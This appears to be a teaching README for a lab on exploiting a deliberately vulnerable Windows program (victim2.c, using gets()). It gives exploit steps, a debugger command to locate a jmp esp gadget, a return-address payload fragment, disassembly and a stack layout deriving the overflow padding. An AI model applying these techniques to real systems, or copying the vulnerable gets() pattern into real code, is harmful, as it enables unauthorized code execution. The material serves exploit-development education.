# Attack a vulnerable program using gets() and small buffer with Python from command line

victim2.c uses the vunerable function *gets()*, which accepts use input and puts the input into a local buffer. The local buffer is small and may not hold the entire malicious code. Therefore, we use the trick *jmp esp* to perform the buffer overflow attack. The malcious code is put at the end of the malicious string.

To run this example, download all files to a Windows folder. Here is the video demo.

[![Video demo of attacking victim2.exe](https://img.youtube.com/vi/SH-eCEwla_Y/1.jpg)](https://youtu.be/SH-eCEwla_Y)

## Steps to exploit victim2.exe

### Step 1. Compile victim2.c
```
gcc -m32 -o victim2.exe victim2.c
```

### Step 2. Find the address of *jmp esp* from the computer memory

Load any program into *Immmunity Debugger*, e.g., victim2.exe. Use *mona* to find the address of jmp esp
```
!mona jmp -r esp -m kernel
```
### Step 3. Replace the address of *jmp esp* in exploit2.py
```
# Address of jmp esp found by immunity debugger. Change it after every Windows reboot
payload += b"\xE4\x08\x17\x77"
```
The shellcode finds the address of *WinExec* **autoamatically** to run *calc.exe*.

### Step 4. Exploit
```
python exploit2.py
```

## Notes:

### Disassembly of the main function by IDA Freeware
```
.text:004015C0 ; Attributes: bp-based frame fuzzy-sp
.text:004015C0
.text:004015C0 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:004015C0                 public _main
.text:004015C0 _main           proc near               ; CODE XREF: ___tmainCRTStartup+236â†‘p
.text:004015C0
.text:004015C0 var_32          = byte ptr -32h
.text:004015C0 argc            = dword ptr  8
.text:004015C0 argv            = dword ptr  0Ch
.text:004015C0 envp            = dword ptr  10h
.text:004015C0
.text:004015C0                 push    ebp
.text:004015C1                 mov     ebp, esp
.text:004015C3                 and     esp, 0FFFFFFF0h
.text:004015C6                 sub     esp, 50h
.text:004015C9                 call    ___main
.text:004015CE                 lea     eax, [esp+50h+var_32]
.text:004015D2                 mov     [esp], eax      ; char *
.text:004015D5                 call    _gets
.text:004015DA                 mov     eax, 0
.text:004015DF                 leave
.text:004015E0                 retn
.text:004015E0 _main           endp
```

### Derivation of the padding in the malicious string
In exploit2.py, when we craft the malicious string, the first 62 bytes are the padding that is used to overwrite the stack from the local buffer *str* to the return address (excluded) of the *main* function. The stack layout below shows why 62 bytes of padding are needed.

```
                                  High address
        +----------------------+  
        |                      |
        +----------------------+
        |                      |
        .                      .              
        |      shellcode       |
        +----------------------+ <-------------------------|
        |    return address    |  4 bytes   ------>   jmp esp
        +----------------------+                    
        |      old ebp         |  4 bytes
EBP ->  +----------------------+
        |                      |  4 bytes
        +----------------------+
        |                      |  4 bytes
        +----------------------+    ---
        |                      |     /\
        .         str          .  50 (32h) bytes
        |                      |     \/
        +----------------------+    --- 
                                  Low address
```
